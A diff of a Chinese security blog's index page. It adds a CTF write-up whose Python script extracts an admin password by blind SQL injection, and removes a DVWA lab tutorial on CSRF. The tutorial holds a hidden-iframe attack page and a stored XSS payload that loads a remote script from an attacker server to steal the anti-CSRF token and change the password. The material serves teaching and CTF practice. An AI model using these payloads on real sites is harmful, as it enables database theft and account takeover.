@@ -252,6 +252,190 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/12/N1CTF2018/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lawliet">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/LuFei.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lawliet Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/03/12/N1CTF2018/" itemprop="url">N1CTF2018 77777 writeup</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-12T10:53:49+08:00">
+                2018-03-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="N1CTF2018-77777-writeup"><a href="#N1CTF2018-77777-writeup" class="headerlink" title="N1CTF2018 77777 writeup"></a>N1CTF2018 77777 writeup</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>之前比赛开始时看了签到题，死活没写出来，泪，之后听同学说起了这道题，在结束前不到一小时做了做，无奈比赛结束，flag没交上去，那就记录一下过程吧</strong></p>
+<h3 id="题目：77777"><a href="#题目：77777" class="headerlink" title="题目：77777"></a>题目：77777</h3><p><strong>题目说”77777” is my girlfriend’s nickname，出题人大佬的女朋友外号叫77777，当然以我看过签到题的心情来看，这和道题并没什么关系，重点还在题目中给的一小段代码中，代码如下</strong></p>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/a2EE46LmeH.png?imageslim" alt="mark"></p>
+<p><strong>代码接收post参数中的flag和hi，拼接后更新数据库的points值，并在<code>http://47.97.168.223/#profile</code>页面中显示points值，简单来说，post参数可控，我们可以提交参数构造数据库中女朋友的points，并且在页面显示points值</strong></p>
+<pre><code>update users set points=&apos;post过来的flag和hi拼接后的结果&apos;
+</code></pre><p><strong>当然hi是经过waf函数处理的，看来是绕waf的注入，简单了测试了一下，过滤了updatexml,extractvalue,database()等函数，报错回显这个思路暂时放弃了，因为information_schema也被过滤了，做起来会很麻烦</strong></p>
+<p><strong>题目的第二个提示</strong></p>
+<pre><code>the flag is `admin&apos;s password`:)
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/Hj66G37HjJ.png?imageslim" alt="mark"><br><strong>猜测数据库里有password字段,由此想到第二个思路，提交:</strong></p>
+<pre><code>flag=任意数字&amp;hi=任意数字 and (构造逻辑判断)
+</code></pre><p><strong>数据库语句变为:</strong></p>
+<pre><code>update users set points=任意数字 and （构造逻辑判断）
+</code></pre><p><strong>如果逻辑判断为真，将points值更新为1，为假则更新为0,构造逻辑判断的时候发现=也被过滤，用like替代即可,思路有了开始写脚本</strong></p>
+<pre><code>import requests
+import string
+list=string.maketrans(&quot;&quot;,&quot;&quot;)[33:127]#所有可显示字符，后面猜测password内容使用
+url=&quot;http://47.97.168.223/#profile&quot;#显示分数页面
+#read password
+#i=0
+#while 1:
+#    payload={&apos;flag&apos;:1,&apos;hi&apos;:&apos;1 and length(password) like %d&apos;%(i)}
+#    html=requests.post(url=url,data=payload).content
+#    if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明长度正确，输出并break
+#        print i
+#        break
+#    else:
+#        i=i+1
+#password length is 13
+#read password
+i=0
+for i in range(1,14):
+    for j in list:
+        payload={&apos;flag&apos;:1,&apos;hi&apos;:&quot;1 and substr(password,%d,1) like &apos;%s&apos;&quot;%(i,j)}
+        html=requests.post(url=url,data=payload).content
+        if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明内容正确，输出并break
+            print j
+            break
+#flag is HE3L3LOCAT233
+</code></pre><p><strong>脚本通过<code>1 and length(password) like %d</code>来判断password长度为13，为真时页面points显示为1，否则为0</strong></p>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/823DJ2bh5f.png?imageslim" alt="mark"></p>
+<p><strong>然后<code>1 and substr(password,%d,1) like &#39;%s&#39;</code>循环判断password内容，为真时页面的points值显示为1，否则为0</strong></p>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/FGB5bcl7F0.png?imageslim" alt="mark"></p>
+<p><strong>flag为N1CTF{HE3L3LOCAT233}</strong></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/27/centos7mysql/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2677,313 +2861,6 @@ generateSessionToken();
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/22/DVWA CSRF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Lawliet">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/LuFei.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lawliet Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/12/22/DVWA CSRF/" itemprop="url">dvwa CSRF</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-22T23:52:04+08:00">
-                2017-12-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">web安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="dvwa-CSRF"><a href="#dvwa-CSRF" class="headerlink" title="dvwa CSRF"></a>dvwa CSRF</h1><h3 id="何为csrf"><a href="#何为csrf" class="headerlink" title="何为csrf"></a>何为csrf</h3><p><strong>csrf的全称为跨站请求伪造，都有着跨站两字，但和之前的xss(跨站脚本攻击)不同的是csrf是利用目标网站用户的身份去做一些事情，相当于借刀杀人，突出在伪造两字，下面通过dvwa来研究一下csrf，使用csrf修改网站用户密码</strong></p>
-<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p><strong>一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口</strong><br><strong>一台win7虚拟机，ip为192.168.50.155,攻击者的服务器，web由phpstudy搭建</strong><br><strong>默认登陆用户名密码为admin,password，我们用csrf漏洞去修改密码</strong></p>
-<h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p><strong>low级别代码</strong><br>    &lt;?php</p>
-<pre><code>if( isset( $_GET[ &apos;Change&apos; ] ) ) {
-    // Get input
-    $pass_new  = $_GET[ &apos;password_new&apos; ];
-    $pass_conf = $_GET[ &apos;password_conf&apos; ];
-
-    // Do the passwords match?
-    if( $pass_new == $pass_conf ) {
-    // They do!
-        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
-        $pass_new = md5( $pass_new );
-
-        // Update the database
-        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;
-        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
-
-        // Feedback for the user
-        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
-    }
-    else {
-        // Issue with passwords matching
-        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
-    }
-
-    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
-}
-
-?&gt;
-</code></pre><p><strong>该代码接收网站用户传来的新密码判断是否一致，一致的话就更新数据库的网站该用户的密码</strong><br><strong>再看页面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/hijFlc0kkk.PNG" alt="mark"><br><strong>dvwa为我们展示的是一个正常修改密码的页面，用户通过表单填写新密码即可修改密码</strong><br><strong>用burp抓包看看用户填写新密码到点击提交的过程中发生了什么</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/KJ2J2HGDeh.PNG" alt="mark"><br><strong>可以看出用户提交从填写密码到提交到服务器实际上是向服务器发送了一个http数据包</strong></p>
-<pre><code>GET /DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change HTTP/1.1
-Host: 192.168.50.128:8080
-User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-Referer: http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/
-Cookie: security=low; PHPSESSID=a6bnfv0lnvsho8sq9v3ofqg6r7
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-</code></pre><p><strong>简单的来说，服务器接收到这个http数据包就会做出响应修改密码</strong><br><strong>现在来思考一下，如果我们诱使用户去点击我们构造的链接</strong></p>
-<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change
-</code></pre><p><strong>受害用户点击后，也发出一样的http请求，将用户的密码改为<code>hacker</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/D0gA6KCbiJ.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/A9G4Ib0lcK.PNG" alt="mark"><br><strong>服务器接受到请求便会修改密码，这种攻击手段可以看作是借受害用户的身份（cookie）去做用户做的事情，通过简单的csrf可以看出csrf相对xss，仅仅利用用户的身份便可以做任何受害用户可以做的事情</strong><br><strong>可以看出只要我们诱使用户向服务器发出相应的http请求就可以达到修改密码的效果</strong><br><strong>上面诱使用户去点击我们构造的链接是一种方式</strong><br><strong>另一种方式是诱使用户去点击我们构造的具有吸引力的页面，并在页面中用src加载链接，就相当于向服务器发送了一次http请求</strong><br><strong>来看一个页面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/H2HJ4bgFlK.PNG" alt="mark"></p>
-<pre><code>http://192.168.50.155/dvwacsrf/mengmeizi.html
-</code></pre><p><strong>这是黑客服务器上的一个页面，只要诱惑受害人访问就能产生跨站请求伪造，页面中有一个很萌的二次元妹子图片，看起来并没有什么问题</strong><br><strong>但是查看一下页面源代码</strong></p>
-<pre><code>&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
-    &lt;title&gt;动漫萌妹子&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;div id=&quot;meizi1&quot;&gt;
-        &lt;img src=&quot;images/timg.jpg&quot;&gt;
-        &lt;iframe src=&quot;http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change&quot; style=&quot;display:none&quot;&gt;
-    &lt;/div&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p><strong>发现用iframe标签的src属性加载一个链接</strong></p>
-<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change
-</code></pre><p><strong>并且将style属性的值设为<code>display:none</code>，将iframe框架中的内容隐藏起来</strong><br><strong>src加载了链接就相当于向该链接中的服务器发送了一次修改密码的http请求，这一点可以通过浏览器插件firebug抓包就可以发现</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/e5HEhfa9fa.PNG" alt="mark"><br><strong>所以只要黑客诱使受害者访问该页面就会发送相应的http请求给存在csrf漏洞的网站服务器，修改受害用户的密码</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/A9G4Ib0lcK.PNG" alt="mark"></p>
-<h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>代码如下</strong></p>
-<pre><code>&lt;?php
-
-if( isset( $_GET[ &apos;Change&apos; ] ) ) {
-    // Checks to see where the request came from
-    if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) {
-        // Get input
-        $pass_new  = $_GET[ &apos;password_new&apos; ];
-        $pass_conf = $_GET[ &apos;password_conf&apos; ];
-
-        // Do the passwords match?
-        if( $pass_new == $pass_conf ) {
-            // They do!
-            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
-            $pass_new = md5( $pass_new );
-
-            // Update the database
-            $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;
-            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
-
-            // Feedback for the user
-            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
-        }
-        else {
-            // Issue with passwords matching
-            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
-        }
-    }
-    else {
-        // Didn&apos;t come from a trusted source
-        echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;;
-    }
-
-    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
-}
-
-?&gt;
-</code></pre><p><strong>可看到多了一些防御手段，要求修改密码的http数据包的Referer字段中必须有Host的名字，也就是要求修改密码的这个http请求必须是从修改密码的页面发出的才可以，来简单分析一下，如果是当前网站的用户要修改密码，他就必然要访问该网站修改密码的页面，所以点击提交按钮后http的请求中的Referer字段中必然会有该网站的主机名，但是如果是用户直接点击了修改密码的链接，或者访问了黑客服务器的页面，那么http数据包里的Referer值中就不会有该网站的主机，对比一下http数据包的Referer值即可明白</strong><br><strong>如果是用户自己修改的密码，那么Referer值为</strong></p>
-<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/
-</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/KJ2J2HGDeh.PNG" alt="mark"><br><strong>如果用户是在不知情的情况下向服务器发送了修改密码的http请求，那么Referer值就不会有网站的Host值</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/D0gA6KCbiJ.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/e5HEhfa9fa.PNG" alt="mark"><br><strong>看似这种防御已经没什么问题了，但是如果我们将黑客服务器上的页面的文件名改为192.168.50.128:8080.html的话，就可以绕过，但是windows的文件名不能有<code>:</code>这个字符，所以没有尝试成功，不过这样绕过是肯定可以的</strong></p>
-<h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><p><strong>代码如下</strong><br>    &lt;?php</p>
-<pre><code>if( isset( $_GET[ &apos;Change&apos; ] ) ) {
-    // Check Anti-CSRF token
-    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );
-
-    // Get input
-    $pass_new  = $_GET[ &apos;password_new&apos; ];
-    $pass_conf = $_GET[ &apos;password_conf&apos; ];
-
-    // Do the passwords match?
-    if( $pass_new == $pass_conf ) {
-        // They do!
-        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
-        $pass_new = md5( $pass_new );
-
-        // Update the database
-        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;
-        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
-
-        // Feedback for the user
-        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
-    }
-    else {
-        // Issue with passwords matching
-        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
-    }
-
-    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
-}
-
-// Generate Anti-CSRF token
-generateSessionToken();
-
-?&gt;
-</code></pre><p><strong>可以看出这次使用的是token防御，在修改密码的页面的表单中带上一个token，当用户修改密码后点击提交后发送的http请求中会带上页面的token值</strong></p>
-<pre><code>GET /DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change&amp;user_token=78f083605aa7d8cfb698eb414ffa7064 HTTP/1.1
-Host: 192.168.50.128:8080
-User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-Referer: http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/
-Cookie: security=high; PHPSESSID=a6bnfv0lnvsho8sq9v3ofqg6r7
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-</code></pre><p><strong>这个token值是随机生成的，也是攻击者所猜不到的，所以完全的做到了防御csrf</strong></p>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/b1EChEKHci.PNG" alt="mark"><br><strong>但是高危级别的dvwa有着xss漏洞，我们可以利用存储型xss来完成这次csrf攻击</strong><br><strong>在存储型xss的地方提交</strong></p>
-<pre><code>Name：&lt;iframe src=&quot;../csrf&quot; style=&quot;display:none&quot; onload=&quot;var a= documen&amp;#x74;.crea&amp;#x74;eElemen&amp;#x74;(&apos;scrip&amp;#x74;&apos;);a.se&amp;#x74;A&amp;#x74;&amp;#x74;ribu&amp;#x74;e(&apos;src&apos;,&apos;h&amp;#x74;&amp;#x74;p://192.168.50.155/dvwacsrf/changepw.js&apos;);documen&amp;#x74;.ge&amp;#x74;Elemen&amp;#x74;sBy&amp;#x54;agName(&apos;head&apos;)[0].appendChild(a);&quot;&gt;
-Message：use csrf by xss
-</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/iceIl38iCE.PNG" alt="mark"><br><strong>使用iframe将存在csrf的页面加载到存在xss的页面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/bKaGdJ3m7I.PNG" alt="mark"><br><strong>利用iframe标签的onload事件进行javascript dom操作创建<code>script</code>标签加载远程脚本<code>http://192.168.50.155/dvwacsrf/changepw.js</code>，这种方法在之前的xss文章中写到过</strong><br><strong>changepw.js代码如下</strong></p>
-<pre><code>var token=frames[0].document.getElementsByName(&quot;user_token&quot;)[0].value;
-var url = &quot;http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change&amp;user_token=&quot;+token;
-var ajax = null;
-if (window.XMLHttpRequest) {
-    ajax = new XMLHttpRequest();
-} else if (window.ActiveXObject) {
-    ajax = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
-} else {
-    ajax=null;
-}
-ajax.open(&quot;GET&quot;, url, true);
-ajax.send(null);
-</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/2hHm9ABIbf.PNG" alt="mark"><br><strong>这段js代码将获取iframe标签中src加载的存在csrf页面的表单隐藏域中的token，然后通过ajax向服务器发送修改密码的http请求并带上token，通过存储型xss可以成功的利用的本不可能产生的csrf漏洞修改用户密码</strong><br><strong>用firebug抓包可以观察到利用xss漏洞将会获取存在csrf页面的token并将token附带到修改密码的http请求中发送到服务器</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/bd1bcA49C3.PNG" alt="mark"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>从对dvwa中csrf的研究可以看出csrf最有效的防御方式还是利用token来进行防御</strong></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3038,7 +2915,7 @@ ajax.send(null);
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-count">32</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
